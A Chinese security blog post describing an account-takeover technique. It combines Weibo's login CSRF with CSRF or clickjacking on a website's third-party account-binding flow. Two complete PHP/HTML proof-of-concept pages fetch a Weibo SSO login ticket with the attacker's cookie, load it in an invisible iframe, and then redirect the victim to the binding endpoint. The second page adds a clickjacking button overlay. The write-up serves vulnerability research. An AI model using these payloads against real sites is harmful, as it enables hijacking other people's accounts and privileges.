---
layout: post
author: Vulkey_Chen
title: "CSRF之你登陆我的账号#业务逻辑组合拳劫持你的权限"
date: 2018-04-28
categories: 业务逻辑测试
permalink: /archives/2018-04-28/1
description: "CSRF之你登陆我的账号#业务逻辑组合拳劫持你的权限"
---

## 前言

这是一个理论上通杀很多大型企业网站的漏洞缺陷~

<!-- more -->

可能很多朋友点击来看见标题就觉得，`这家伙在吹牛逼了我倒要看看这货能怎么吹,CSRF之登陆我的账号能有啥玩意危害？ `

先按奈住你心中不屑的情绪，听我慢慢道来~

## 通用业务功能分析

最近很喜欢挖一些通用漏洞（不是程序通用，而是功能通用），会经常拿着BAT三家以及其他一些大型网站进行业务功能点的对比，来看看有哪些是共用的功能点，这边列出以下的几条：

1. QQ快捷登陆
2. 微信快捷登陆
3. 微博快捷登陆
4. 其他......

![0x00.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x00.png)

OAuth2.0认证缺陷-快捷登陆账号劫持的问题具体可以参考：http://gh0st.cn/archives/2018-02-12/1 （**来自i春秋社区**）

这种问题其实需要一定的运气因为很多的快捷登陆有state参数的干扰，所以是完全没办法去利用的。

在这里我尝试能不能挖到一个新的缺陷，在走正常的快捷登陆流程时我发现需要绑定这个网站的账号才可以正常的使用用户的功能，这时候反着想网站的用户中心是否有第三方的账号绑定？

这里找了大部分的网站都有这样的功能（第三方账号绑定，绑定了即可使用第三方账号直接登陆），找到了这个功能点就可以来测试，先走一遍正常的绑定流程：

- 点击绑定第三方账号
- 进入第三方账号绑定页面
- （如果第三方账号是登陆状态）->需要点击授权按钮；(如果第三方账号是未登陆状态)->需要输入第三方的账号密码登陆->点击授权按钮

![0x01.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x01.png)

## 设立猜想

梳理了流程之后，一个很骚的思路就从脑子里蹦了出来：

有第三方账号绑定这个功能，登陆处也有第三方账号登陆功能，也就是说绑定第三方账号代表着权限分享给了第三方账号。

猜想建立->如果我有第三方账号所在网站的`CSRF之你登陆我的账号`缺陷，让受害者先登陆我的第三方账号（为了避免损失，我可以注册一个小号），然后绑定处也有CSRF绑定的缺陷或者点击劫持问题，那么我就可以让受害者绑定我的第三方账号，然后根据我的第三方账号来登陆受害者的账号，劫持到其权限。

![0x02.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x02.png)

## 验证猜想

### 流程

个人中心有这个第三方的账号绑定：

![0x03.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x03.png)

在这里QQ、github、微博、微信四个第三方账号绑定中我有了微博的`CSRF之你登陆我的账号`这个缺陷，所以这里测试下微博的第三方账号绑定。

页面有微博账号绑定的跳转链接：

![0x04](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x04.png)

通过这个链接进入了绑定的界面（未登陆微博）：

![0x05.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x05.png)

通过这个链接进入了绑定的界面（已登陆微博）：

![0x06.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x06.png)

当我授权绑定之后，微博发生了变化，管理中心->我的应用->我的应用：

![0x07.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x07.png)

会多出这个网站在里面，那么这个变化是对我们有利的，还是？

这里我解绑了微博，然后再使用这个已经授权了的微博进行绑定，发现居然不用点击授权了，直接就绑定了。

很显然，在这里这个`便利`解决了一些攻击的利用难度。

### 实现

我们现在具备的几个条件：

1. 微博的`CSRF之你登陆我的账号`缺陷：

登陆你的微博，然后访问http://login.sina.com.cn/sso/crossdomain.php?action=login，会返回这样的内容给你：

![0x08.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x08.png)

其中arrURL对应的链接就是凭证登陆的~

2. 你的微博已经授权过了要存在缺陷的网站(这里方便直接跳转而不用再去点击按钮！所以你可以先用自己的微博绑定下存在缺陷的网站的账号，然后解绑就行了~)
3. 绑定请求存在csrf的缺陷（这里因为是GET请求类型 `/oauth/weibo/redirect`，而一般不会对GET请求类型进行CSRF的限制~~）

#### 场景1.攻击步骤：

对方点开凭证链接登陆了你的微博，对方点开绑定微博的链接，绑定了你的微博，完成攻击。

考虑到凭证时效性的问题，在这里写了一个动态的PoC：

```php
<?php
//get weibo login token
$curl = curl_init();
$cookie = "你微博的Cookie";
curl_setopt($curl, CURLOPT_URL, 'http://login.sina.com.cn/sso/crossdomain.php?action=login');
curl_setopt($curl, CURLOPT_HEADER, 1);
curl_setopt($curl, CURLOPT_COOKIE, $cookie);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$data = curl_exec($curl);
curl_close($curl);
//echo $data;
$t = preg_match('/ticket=(.*?)&sso/', $data, $res);
$url = "https://passport.weibo.com/wbsso/login?ticket={$res[1]}&ssosavestate=1556602678";
?>

<html>
<head>
<style type="text/css"> 
.testframe {
	height: 100%;
} 
iframe {
	height: 100%;
	width: 100%;
	border: 0;
	margin: 0;
	padding: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
</style>
</head>
<body>
<div class="testframe">
	<iframe id="test0" src="<?php echo $url;?>"></iframe>
</div>
<script>
function loadsrc(){
    document.getElementById("test0").src="https://gh0st.cn/oauth/weibo/redirect";
}
setTimeout("loadsrc()",2000);
</script>
</body>
</html>
```

#### 场景2.攻击步骤：

有些网站可能是post请求限制了referer或者根本没有跳转的请求而是直接进入了微博的绑定界面，因为state参数的原因导致根本无法以这个绑定页面为链接的形式去做攻击~

可能有很多朋友就有疑问了，为什么我老是提到state参数？这个参数是干什么用的呢？这里参考下微博的OAuth2.0接口的开发文档：

http://open.weibo.com/wiki/Oauth2/authorize

![0x09.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x09.png)

是防止CSRF的，也就是说在这里如果绑定的链接是如下这样子的：

![0x10.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x10.png)

没有state参数验证的，那么你可以直接以此作为绑定链接，**覆盖场景1中PoC里面的这个链接**:`https://gh0st.cn/oauth/weibo/redirect`

好了，说了那么多跟场景2没用的话，切入主题来说说场景2的情况到底该如何完成攻击？

很简单我们可以使用点击劫持来完成攻击，如下动态的PoC：

```php
<?php
//get weibo login token
$curl = curl_init();
$cookie = "你微博的Cookie";
curl_setopt($curl, CURLOPT_URL, 'http://login.sina.com.cn/sso/crossdomain.php?action=login');
curl_setopt($curl, CURLOPT_HEADER, 1);
curl_setopt($curl, CURLOPT_COOKIE, $cookie);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$data = curl_exec($curl);
curl_close($curl);
//echo $data;
$t = preg_match('/ticket=(.*?)&sso/', $data, $res);
$url = "https://passport.weibo.com/wbsso/login?ticket={$res[1]}&ssosavestate=1556602678";
?>

<html>
<head>
<style type="text/css"> 
.testframe {
	height: 100%;
} 
iframe {
	height: 100%;
	width: 100%;
	border: 0;
	margin: 0;
	padding: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
.btn {
    position: fixed;
    width: 70px;
    height: 22px;
    left: 167px;
    right: 0;
    display:block;
    top: 295px;
} 
</style>
</head>
<body>
<div class="testframe">
    <input type="button" class="btn" value="Click">
	<iframe id="test0" src="<?php echo $url;?>"></iframe>
</div>
<script>
function loadsrc(){
	document.getElementById("test0").src="https://gh0st.cn/usercenter/ubind";
}
setTimeout("loadsrc()",2000);
</script>
</body>
</html>
```

简单的说明下这个PoC的用处：

![0x11.png](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-04-28/0x11.png)

## 总结

可能把每一项单独的拎出来会发现这并没有缺陷，但是一旦参与到了业务逻辑中，就一定会存在一定的问题。

不要看不起一个看似没危害的漏洞甚至一个缺陷，因为你永远不知道它能发挥的巨大危害。
